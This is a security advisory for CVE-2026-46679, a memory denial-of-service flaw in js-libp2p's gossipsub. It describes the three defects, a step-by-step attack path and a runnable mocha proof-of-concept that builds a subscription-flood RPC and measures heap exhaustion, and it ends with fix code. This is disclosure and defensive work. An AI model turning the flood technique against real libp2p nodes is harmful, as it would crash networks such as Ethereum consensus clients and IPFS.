# [H] js-libp2p: Memory DoS via subscription flood of unique topics

## Summary
Severity: High
Advisory: GHSA-4f8r-922h-2vgv
CVE: CVE-2026-46679
CWE: CWE-20, CWE-400, CWE-401
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-21
Source: https://github.com/advisories/GHSA-4f8r-922h-2vgv
Type: github-advisory

## Affected
- npm: `@libp2p/gossipsub` — affected >=0 <15.0.23

## Details
### Summary
Three cooperating omissions in `@libp2p/gossipsub` allow an unauthenticated single peer to exhaust the Node.js heap of any gossipsub node with default options.

1. **`defaultDecodeRpcLimits.maxSubscriptions = Infinity`** (`packages/gossipsub/src/message/decodeRpc.ts:11`): no decode-level cap on subscription entries per RPC.
2. **`handleReceivedSubscription` is unbounded** (`gossipsub.ts:1009-1021`): every unique topic string creates a new `Map` entry + `Set` object in `this.topics` with no per-peer count limit.
3. **`removePeer` leaves empty Sets** (`gossipsub.ts:782-784`): after peer disconnect, empty Sets are never deleted from `this.topics` thus memory is non-reclaimable within the process lifetime.

A single 4MB LP frame carries 349,525 unique topic SUBSCRIBE entries. Each frame causes ~89MB of heap growth (~22x amplification). A Node.js process with a 1.5GB heap limit crashes after ~17 such frames (~68MB total attacker bandwidth, achievable in ~5 seconds at 100Mbps).

### Details
#### Defect 1: `defaultDecodeRpcLimits.maxSubscriptions = Infinity` (`message/decodeRpc.ts:11`)

```typescript                                                                                              
export const defaultDecodeRpcLimits: DecodeRPCLimits = {                                                   
  maxSubscriptions: Infinity,   // <- no decode-level cap                                                   
  // ...                                             
}                                                    
```

Passed directly to the protobuf decoder at `gossipsub.ts:863`. A single RPC may decode 349,525 SUBSCRIBE entries within the 4MB LP frame with no error.

#### Defect 2: `handleReceivedSubscription` unbounded growth (`gossipsub.ts:1009-1021`)

```typescript                                        
let topicSet = this.topics.get(topic)
if (topicSet == null) {
  topicSet = new Set()
  this.topics.set(topic, topicSet)   // new entry per unique topic, no count guard
}
topicSet.add(from.toString())
```

`this.topics` (`Map<TopicStr, Set<PeerIdStr>>`, `gossipsub.ts:141`) has no size limit. No per-peer topic count is tracked. No heartbeat evicts unused entries. A comment at `gossipsub.ts:960` acknowledges the map is "not bounded by topic count", but only for the `allowedTopics != null` branch, the default is `null`.

#### Defect 3: `removePeer` memory leak (`gossipsub.ts:782-784`)

```typescript                                        
for (const peers of this.topics.values()) {
  peers.delete(id)
  // empty Set is NOT removed from this.topics
} 
```

After disconnect, `this.topics` retains N empty Sets, one per unique attacker topic. `stop()` (lines 575–602) clears 12 data structures but not `this.topics`. Memory is leaked for the process lifetime.

Secondary: the O(topics.size) synchronous scan in `removePeer` grows as `this.topics` accumulates from repeated attacks. After 17 rounds, the scan iterates ~6M entries each time any peer disconnects.

#### Attack path                                      

1. Attacker dials victim and opens a gossipsub stream.
2. Score 0 > `gossipThreshold = −10` thus subscriptions are processed immediately. No score check gates subscription handling.
3. Attacker constructs an RPC: 349,525 SUBSCRIBE entries with sequential 6-char topics. Total encoded size: 4.00 MB.
4. Victim's `handleReceivedRpc` calls `rpc.subscriptions.forEach(...)` → 349,525 calls to `handleReceivedSubscription` -> `this.topics` grows by 349,525 entries -> ~89MB heap consumed -> ~224ms event-loop blocked.
5. Attacker reconnects. No score decay or penalty applies to subscription RPCs. Repeat.
6. After ~17 rounds (68MB attacker bandwidth): Node.js OOM (Out-Of-Memory) crash.

### PoC
**Steps to reproduce** (confirmed unpatched at HEAD `9eb27be79`):

```bash                                              
$ git clone https://github.com/libp2p/js-libp2p.git
$ cd js-libp2p                                         
$ npm install                                          
$ cd packages/gossipsub                                
$ npx aegir build                                      
$ node --experimental-vm-modules ../../node_modules/.bin/mocha 'dist/test/poc.js' --timeout 60000                                        
```

File PoC:
```typescript
/* eslint-env mocha */

import { stop } from '@libp2p/interface'
import assert from 'node:assert'
import { performance } from 'node:perf_hooks'
import { RPC } from '../src/message/rpc.js'
import { createComponents, connectPubsubNodes } from './utils/create-pubsub.js'
import type { GossipSubAndComponents } from './utils/create-pubsub.js'

// Number of unique topics per attack RPC (for direct injection tests).
// Chosen to demonstrate impact without LP-framing; the ENCODE test shows
// how many actually fit in one 4 MB frame.
const UNIQUE_TOPICS_PER_RPC = 349_000

// Build a protobuf-encoded RPC with N unique SUBSCRIBE entries.
// Uses minimal 2-char topic strings ("00".."zz") to maximise packing.
// SubOpts(subscribe=true, topic=2chars): 2 + (2+2) = 6 bytes per entry.
// Outer RPC field: tag+len ≈ 2 bytes -> ~8 bytes total per subscription.
// 4 MB / 8 bytes ≈ 524K subscriptions per frame.
function buildSubscriptionFloodRpc (count: number): Uint8Array {
  const subscriptions = Array.from({ length: count }, (_, i) => ({
    subscribe: true,
    // Sequential 6-char decimal topics: short but still unique
    topic: i.toString().padStart(6, '0')
  }))
  return RPC.encode({ subscriptions, messages: [], control: undefined })
}

// Binary-search the exact number of unique 6-char topics that fit in 4 MB.
function maxTopicsIn4MB (): number {
  const MAX_LP_BYTES = 4 * 1024 * 1024
  let lo = 1; let hi = 600_000
  while (lo < hi) {
    const mid = (lo + hi + 1) >> 1
    if (buildSubscriptionFloodRpc(mid).byteLength <= MAX_LP_BYTES) {
      lo = mid
    } else {
      hi = mid - 1
    }
  }
  return lo
}

describe('PoC: Memory DoS via subscription flood of unique topics', function () {
  this.timeout(60_000)

  let victim: GossipSubAndComponents
  let attacker: GossipSubAndComponents

  beforeEach(async () => {
    ;[victim, attacker] = await Promise.all([
      createComponents({ init: { allowPublishToZeroTopicPeers: true } }),
      createComponents({ init: { allowPublishToZeroTopicPeers: true } })
    ])
    await connectPubsubNodes(victim, attacker)
  })

  afterEach(async () => {
    await stop(
      victim.pubsub, attacker.pubsub,
      ...Object.values(victim.components),
      ...Object.values(attacker.components)
    )
  })

  it('FLOOD: unique topic subscriptions accumulate unboundedly in this.topics', () => {
    const victimPubsub = victim.pubsub as any
    const attackerIdStr = attacker.components.peerId.toString()

    const topicsBefore = victimPubsub.topics.size as number
    const heapBefore = process.memoryUsage().heapUsed

    // Simulate one round of subscription flood: inject UNIQUE_TOPICS_PER_RPC
    // unique topics directly via handleReceivedSubscription (the exact function
    // called synchronously from handleReceivedRpc for each decoded SubOpts entry).
    const t0 = performance.now()
    for (let i = 0; i < UNIQUE_TOPICS_PER_RPC; i++) {
      victimPubsub.handleReceivedSubscription(
        { toString: () => attackerIdStr } as any,
        `poc-sub-flood-${i.toString().padStart(6, '0')}`,
        true
      )
    }
    const elapsed = performance.now() - t0

    const topicsAfter = victimPubsub.topics.size as number
    const heapAfterBytes = process.memoryUsage().heapUsed
    const heapGrowthMB = (heapAfterBytes - heapBefore) / (1024 * 1024)
    const newTopics = topicsAfter - topicsBefore

    console.log(`\n[PoC] Unique topics injected: ${UNIQUE_TOPICS_PER_RPC.toLocaleString()}`)
    console.log(`[PoC] this.topics.size: ${topicsBefore} -> ${topicsAfter} (grew by ${newTopics.toLocaleString()})`)
    console.log(`[PoC] Heap growth (approx): ${heapGrowthMB.toFixed(0)} MB`)
    console.log(`[PoC] Time to process: ${elapsed.toFixed(0)} ms (event-loop blocked)`)
    console.log(`[PoC] Amplification: ${(heapGrowthMB / 4).toFixed(1)}x (MB heap per MB of attacker traffic)`)

    // All unique topics must be present in the map — no dedup for unique strings
    assert.strictEqual(newTopics, UNIQUE_TOPICS_PER_RPC,
      `expected this.topics to grow by ${UNIQUE_TOPICS_PER_RPC}, grew by ${newTopics}`)

    // Must be non-trivial heap growth
    assert.ok(heapGrowthMB > 20,
      `expected >20 MB heap growth from ${UNIQUE_TOPICS_PER_RPC} unique topics, got ${heapGrowthMB.toFixed(0)} MB`)
  })

  it('PERSIST: empty Sets remain in this.topics after peer disconnect (no GC)', () => {
    const victimPubsub = victim.pubsub as any
    const attackerIdStr = attacker.components.peerId.toString()

    // Flood with unique topics
    for (let i = 0; i < UNIQUE_TOPICS_PER_RPC; i++) {
      victimPubsub.handleReceivedSubscription(
        { toString: () => attackerIdStr } as any,
        `poc-persist-${i.toString().padStart(6, '0')}`,
        true
      )
    }

    const topicsBeforeDisconnect = victimPubsub.topics.size as number

    // Simulate peer disconnect, this removes the peer ID from each Set but
    // does NOT delete empty Sets from this.topics.
    const tDisconnect = performance.now()
    victimPubsub.removePeer(attacker.components.peerId)
    const disconnectMs = performance.now() - tDisconnect

    const topicsAfterDisconnect = victimPubsub.topics.size as number

    console.log(`\n[PoC] this.topics.size before disconnect: ${topicsBeforeDisconnect.toLocaleString()}`)
    console.log(`[PoC] this.topics.size after  disconnect: ${topicsAfterDisconnect.toLocaleString()}`)
    console.log(`[PoC] removePeer() took: ${disconnectMs.toFixed(0)} ms (synchronous O(topics.size) scan)`)
    console.log(`[PoC] Empty Sets retained: ${topicsAfterDisconnect.toLocaleString()} -> memory not freed`)

    // Topics Map is unchanged in SIZE — empty Sets persist
    assert.strictEqual(topicsAfterDisconnect, topicsBeforeDisconnect,
      `this.topics.size should be unchanged after disconnect (empty Sets persist); ` +
      `was ${topicsBeforeDisconnect}, now ${topicsAfterDisconnect}`)

    // removePeer O(N) scan should take non-trivial time with 349K entries
    assert.ok(disconnectMs > 5,
      `expected removePeer to take >5ms scanning ${topicsBeforeDisconnect} topics, got ${disconnectMs.toFixed(0)} ms`)

    // Verify Sets are actually empty (peer removed from each)
    let emptyCount = 0
    for (const [, peers] of victimPubsub.topics) {
      if ((peers as Set<string>).size === 0) emptyCount++
    }
    assert.ok(emptyCount >= UNIQUE_TOPICS_PER_RPC,
      `expected ≥${UNIQUE_TOPICS_PER_RPC} empty Sets after disconnect, found ${emptyCount}`)
  })

  it('ENCODE: subscription flood RPC fits within 4 MB LP frame: confirms no LP-level protection', function () {
    this.timeout(30_000)
    const MAX_LP_BYTES = 4 * 1024 * 1024

    // Find exact maximum with binary search
    const maxCount = maxTopicsIn4MB()
    const rpc = buildSubscriptionFloodRpc(maxCount)

    const ampRatio = (maxCount * 260 / (1024 * 1024)) / 4

    console.log(`\n[PoC] Max subscriptions in 4 MB frame: ${maxCount.toLocaleString()}`)
    console.log(`[PoC] Serialised RPC size:              ${(rpc.byteLength / (1024 * 1024)).toFixed(2)} MB`)
    console.log(`[PoC] LP frame limit:                   ${(MAX_LP_BYTES / (1024 * 1024)).toFixed(0)} MB`)
    console.log(`[PoC] Fits in one frame:                ${rpc.byteLength <= MAX_LP_BYTES ? 'YES ✓' : 'NO ✗'}`)
    console.log(`[PoC] defaultDecodeRpcLimits.maxSubscriptions = Infinity (no decode-level cap)`)
    console.log(`[PoC] Heap growth per 4 MB sent: ~${Math.round(maxCount * 260 / (1024 * 1024))} MB (${ampRatio.toFixed(1)}x amplification)`)

    assert.ok(rpc.byteLength <= MAX_LP_BYTES,
      `crafted RPC (${rpc.byteLength} bytes) must fit in the 4 MB LP default — confirms no LP-level protection`)
    assert.ok(maxCount > 100_000,
      `expected >100K subscriptions per 4 MB frame, got ${maxCount}`)
  })
})
```

### Impact
- **Availability (memory)**: single peer, ~68MB bandwidth -> OOM crash in ~5s at 100Mbps. Non-recoverable within process lifetime thus memory never freed even if attacker disconnects.
- **Availability (CPU)**: 224ms event-loop block per 4MB subscription RPC (synchronous `forEach`); grows with accumulated attack state.
- **No score mitigation**: subscription processing has no score check and no score penalty for flooding.
- **Affected deployments**: any node running `@libp2p/gossipsub` with default options that accepts inbound connections: Lodestar (Ethereum consensus), IPFS pubsub, any `createLibp2p({ services: { pubsub: gossipsub() } })`.
- **Partial mitigation only**: setting `opts.allowedTopics` caps growth to `allowedTopics.size` topics per attacker; does not fix the memory leak for allowed topics or the O(N) `removePeer` scan.

### Suggested remediation
Delete empty Sets on unsubscribe and disconnect:

```typescript
// handleReceivedSubscription
} else {
  topicSet.delete(from.toString())
  if (topicSet.size === 0) this.topics.delete(topic)
}

// removePeer
for (const [topic, peers] of this.topics) {
  peers.delete(id)
  if (peers.size === 0) this.topics.delete(topic)
}
```

Clear `this.topics` in `stop()`:

```typescript
this.topics.clear()
```

## References
- https://github.com/libp2p/js-libp2p/security/advisories/GHSA-4f8r-922h-2vgv
- https://nvd.nist.gov/vuln/detail/CVE-2026-46679
- https://github.com/libp2p/js-libp2p
